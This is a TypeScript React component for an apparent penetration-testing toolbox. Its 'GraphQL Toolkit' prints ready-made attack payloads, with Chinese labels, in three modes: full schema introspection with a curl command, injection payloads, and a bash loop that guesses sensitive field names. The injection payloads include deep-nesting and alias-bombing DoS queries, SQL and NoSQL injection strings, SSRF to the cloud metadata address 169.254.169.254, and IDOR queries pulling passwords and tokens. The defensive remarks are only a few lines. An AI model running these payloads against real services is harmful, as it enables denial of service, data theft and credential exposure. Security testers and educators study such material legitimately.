import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * GraphQL Toolkit
 * Generates introspection, injection, and field-suggest payloads.
 * ========================================================== */

const genIntrospection = (): string => {
  const lines: string[] = [];
  lines.push('── GraphQL 内省查询 ──');
  lines.push('');
  lines.push(' ▸ 完整 Schema 内省查询:');
  lines.push('');
  lines.push('   query IntrospectionQuery {');
  lines.push('     __schema {');
  lines.push('       queryType { name }');
  lines.push('       mutationType { name }');
  lines.push('       subscriptionType { name }');
  lines.push('       types {');
  lines.push('         ...FullType');
  lines.push('       }');
  lines.push('       directives {');
  lines.push('         name');
  lines.push('         description');
  lines.push('         locations');
  lines.push('         args { ...InputValue }');
  lines.push('       }');
  lines.push('     }');
  lines.push('   }');
  lines.push('');
  lines.push('   fragment FullType on __Type {');
  lines.push('     kind');
  lines.push('     name');
  lines.push('     description');
  lines.push('     fields(includeDeprecated: true) {');
  lines.push('       name');
  lines.push('       description');
  lines.push('       args { ...InputValue }');
  lines.push('       type { ...TypeRef }');
  lines.push('       isDeprecated');
  lines.push('       deprecationReason');
  lines.push('     }');
  lines.push('     inputFields { ...InputValue }');
  lines.push('     interfaces { ...TypeRef }');
  lines.push('     enumValues(includeDeprecated: true) {');
  lines.push('       name');
  lines.push('       description');
  lines.push('       isDeprecated');
  lines.push('       deprecationReason');
  lines.push('     }');
  lines.push('     possibleTypes { ...TypeRef }');
  lines.push('   }');
  lines.push('');
  lines.push('   fragment InputValue on __InputValue {');
  lines.push('     name');
  lines.push('     description');
  lines.push('     type { ...TypeRef }');
  lines.push('     defaultValue');
  lines.push('   }');
  lines.push('');
  lines.push('   fragment TypeRef on __Type {');
  lines.push('     kind');
  lines.push('     name');
  lines.push('     ofType { kind name ofType { kind name ofType {');
  lines.push('       kind name ofType { kind name ofType { kind name } }');
  lines.push('     } } }');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ 简化版内省:');
  lines.push('   {__schema{types{name fields{name}}}}');
  lines.push('');
  lines.push(' ▸ curl 命令:');
  lines.push('   curl -s -X POST http://target/graphql \\');
  lines.push('     -H "Content-Type: application/json" \\');
  lines.push('     -d \'{"query":"{__schema{types{name fields{name}}}}"}\'');
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - 内省查询可获取完整 API 结构 (类型/字段/参数)');
  lines.push('  - 生产环境应禁用内省, 但许多应用未正确配置');
  lines.push('  - 即使内省关闭, 仍可通过字段推测/错误信息获取信息');
  return lines.join('\n');
};

const genInjection = (): string => {
  const lines: string[] = [];
  lines.push('── GraphQL 注入 Payload ──');
  lines.push('');
  lines.push(' ▸ 嵌套查询 DoS (深度嵌套):');
  lines.push('   query {');
  lines.push('     user(id:1) {');
  lines.push('       friends {');
  lines.push('         friends {');
  lines.push('           friends {');
  lines.push('             friends {');
  lines.push('               friends { id }');
  lines.push('             }');
  lines.push('           }');
  lines.push('         }');
  lines.push('       }');
  lines.push('     }');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ 别名轰炸 (Alias Bombing):');
  lines.push('   query {');
  lines.push('     a1: user(id:1){id}');
  lines.push('     a2: user(id:1){id}');
  lines.push('     a3: user(id:1){id}');
  lines.push('     a4: user(id:1){id}');
  lines.push('     a5: user(id:1){id}');
  lines.push('     # ... 重复1000次');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ 批量查询 (Batch Query):');
  lines.push('   [');
  lines.push('     {"query":"{ user(id:1){id} }"},');
  lines.push('     {"query":"{ user(id:2){id} }"},');
  lines.push('     {"query":"{ user(id:3){id} }"},');
  lines.push('     {"query":"{ user(id:4){id} }"},');
  lines.push('     # ... 大量请求一次发送');
  lines.push('   ]');
  lines.push('');
  lines.push(' ▸ SQL 注入 via GraphQL 参数:');
  lines.push('   query {');
  lines.push('     user(name: "\' OR 1=1--") { id name email }');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ NoSQL 注入:');
  lines.push('   query {');
  lines.push('     user(name: {"$regex":".*"}) { id name email }');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ SSRF via GraphQL:');
  lines.push('   mutation {');
  lines.push('     createWebhook(url: "http://169.254.169.254/latest/meta-data/") {');
  lines.push('       id');
  lines.push('     }');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ IDOR (越权访问):');
  lines.push('   query {');
  lines.push('     user(id: 1) { id email password token }');
  lines.push('     # 尝试遍历 id, 获取其他用户数据');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ 密码枚举 (基于错误差异):');
  lines.push('   mutation {');
  lines.push('     login(username:"admin", password:"wrong") { token }');
  lines.push('     # 对比 "用户不存在" vs "密码错误" 的错误信息');
  lines.push('   }');
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - 深度嵌套可导致递归解析 DoS, 应限制查询深度');
  lines.push('  - 别名轰炸利用单请求中的多个字段别名');
  lines.push('  - 批量查询利用一次 HTTP 请求发送多个 GraphQL 操作');
  lines.push('  - 参数注入与传统注入类似, 注意 GraphQL 参数类型');
  return lines.join('\n');
};

const genFieldSuggest = (): string => {
  const lines: string[] = [];
  lines.push('── GraphQL 字段推测 ──');
  lines.push('');
  lines.push(' ▸ 基于错误信息推断字段:');
  lines.push('');
  lines.push('   # 发送不存在的字段名, GraphQL 会返回建议:');
  lines.push('   query { user(id:1) { id email password } }');
  lines.push('');
  lines.push('   # 错误响应示例:');
  lines.push('   {');
  lines.push('     "errors": [{');
  lines.push('       "message": "Cannot query field \\"password\\" on type \\"User\\". ');
  lines.push('         Did you mean \\"passwd\\" or \\"passwordHash\\"?"');
  lines.push('     }]');
  lines.push('   }');
  lines.push('');
  lines.push(' ▸ 常见敏感字段名探测:');
  lines.push('   password, passwd, passwordHash, token, secret,');
  lines.push('   apiKey, apikey, privateKey, creditCard, ssn,');
  lines.push('   admin, isAdmin, role, permissions, auth');
  lines.push('');
  lines.push(' ▸ 自动探测脚本:');
  lines.push('   #!/bin/bash');
  lines.push('   # 遍历可能的字段名, 根据错误信息中的 "Did you mean" 提取真实字段');
  lines.push('   FIELDS="password passwd token secret admin role auth ssn credit_card"');
  lines.push('   for f in $FIELDS; do');
  lines.push('     echo "[*] Testing: $f"');
  lines.push('     curl -s -X POST http://target/graphql \\');
  lines.push('       -H "Content-Type: application/json" \\');
  lines.push('       -d "{\"query\":\"{user(id:1){$f}}\"}" | jq .');
  lines.push('   done');
  lines.push('');
  lines.push(' ▸ 类型探测:');
  lines.push('   # 探测 Query/Mutation 可用字段:');
  lines.push('   query { __type(name:"Query") { fields { name } } }');
  lines.push('   query { __type(name:"Mutation") { fields { name } } }');
  lines.push('');
  lines.push('   # 探测特定类型的字段:');
  lines.push('   query { __type(name:"User") {');
  lines.push('     fields { name type { name kind ofType { name } } }');
  lines.push('   } }');
  lines.push('');
  lines.push(' ▸ 全盲探测 (无内省 + 无错误信息):');
  lines.push('   # 逐个尝试常见字段, 根据 HTTP 状态码/响应时间判断:');
  lines.push('   query { user(id:1) { id <FIELD> } }');
  lines.push('   # 200 + data → 字段存在');
  lines.push('   # 200 + errors → 字段不存在 (但查询可执行)');
  lines.push('   # 400 → 查询语法错误');
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - GraphQL 默认返回详细的错误信息, 包括字段建议');
  lines.push('  - 即使关闭内省, __type 查询仍可能可用');
  lines.push('  - "Did you mean" 提示是发现隐藏字段的主要手段');
  lines.push('  - 生产环境应关闭详细错误信息和建议功能');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="GraphQL工具"
    paramsConfig={[
      {
        name: 'mode',
        label: '模式',
        type: 'select',
        default: 'introspection',
        options: [
          { value: 'introspection', label: '内省查询' },
          { value: 'injection', label: '注入攻击' },
          { value: 'field-suggest', label: '字段推测' },
        ],
      },
    ]}
    execute={(_input: string, _mode: string, params: Record<string, unknown>): string => {
      const mode = (params.mode as string) ?? 'introspection';
      switch (mode) {
        case 'introspection':
          return genIntrospection();
        case 'injection':
          return genInjection();
        case 'field-suggest':
          return genFieldSuggest();
        default:
          return genIntrospection();
      }
    }}
  />
);
export default ToolComponent;
